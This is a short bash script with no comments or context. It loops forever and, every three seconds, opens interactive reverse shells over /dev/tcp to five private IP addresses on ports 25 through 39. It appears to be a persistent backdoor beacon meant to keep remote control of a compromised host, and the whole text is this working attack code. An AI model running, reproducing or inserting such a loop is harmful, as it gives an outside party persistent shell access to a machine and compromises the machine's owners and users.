while :
do
  sleep 3
  bash -i >& /dev/tcp/172.16.128.110/25 0>&1
  bash -i >& /dev/tcp/172.16.128.111/26 0>&1
  bash -i >& /dev/tcp/172.16.128.112/27 0>&1
  bash -i >& /dev/tcp/172.16.128.113/28 0>&1
  bash -i >& /dev/tcp/172.16.128.114/29 0>&1

  bash -i >& /dev/tcp/172.16.128.110/30 0>&1
  bash -i >& /dev/tcp/172.16.128.111/31 0>&1
  bash -i >& /dev/tcp/172.16.128.112/32 0>&1
  bash -i >& /dev/tcp/172.16.128.113/33 0>&1
  bash -i >& /dev/tcp/172.16.128.114/34 0>&1

  bash -i >& /dev/tcp/172.16.128.110/35 0>&1
  bash -i >& /dev/tcp/172.16.128.111/36 0>&1
  bash -i >& /dev/tcp/172.16.128.112/37 0>&1
  bash -i >& /dev/tcp/172.16.128.113/38 0>&1
  bash -i >& /dev/tcp/172.16.128.114/39 0>&1
done